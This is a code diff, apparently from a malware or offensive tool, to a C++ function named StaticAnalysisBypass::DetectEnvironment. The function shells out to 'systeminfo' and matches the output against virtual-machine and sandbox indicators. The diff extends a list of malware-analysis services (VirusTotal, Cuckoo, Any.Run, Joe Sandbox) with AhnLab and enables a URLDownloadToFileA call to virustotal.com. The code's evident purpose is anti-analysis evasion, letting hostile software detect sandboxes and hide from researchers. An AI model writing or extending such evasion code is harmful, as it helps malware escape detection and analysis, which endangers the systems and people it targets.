@@ -90,8 +90,8 @@ bool StaticAnalysisBypass::DetectEnvironment()
 {
     std::string              system_info = executeCommand("systeminfo");
     std::vector<std::string> vm_indicators = {"VBOX", "VIRTUALBOX", "VMWARE", "XEN", "QEMU", "VIRTUAL", "HYPERVISOR", "SBOX", "SANDBOX", "CWSANDBOX"};
-    std::vector<std::string> analysis_indicators = {"virustotal",  "hybrid-analysis", "cuckoo",       "malwr",     "any.run", "reverse.it",
-                                                    "joe sandbox", "threatgrid",      "cape sandbox", "totalhash", "intezer"};
+    std::vector<std::string> analysis_indicators = {"virustotal",  "hybrid-analysis", "cuckoo",       "malwr",     "any.run", "reverse.it", "joe sandbox", "threatgrid",
+        "cape sandbox", "totalhash",       "intezer", "ahnlab", "AhnLab"};
 
     for (const auto& indicator : vm_indicators)
     {
@@ -105,7 +105,7 @@ bool StaticAnalysisBypass::DetectEnvironment()
             return true;
     }
     
-    //HRESULT hr = URLDownloadToFileA(NULL, "https://www.virustotal.com/", NULL, 0, NULL);
+    HRESULT hr = URLDownloadToFileA(NULL, "https://www.virustotal.com/", NULL, 0, NULL);
     return false;
 }
 
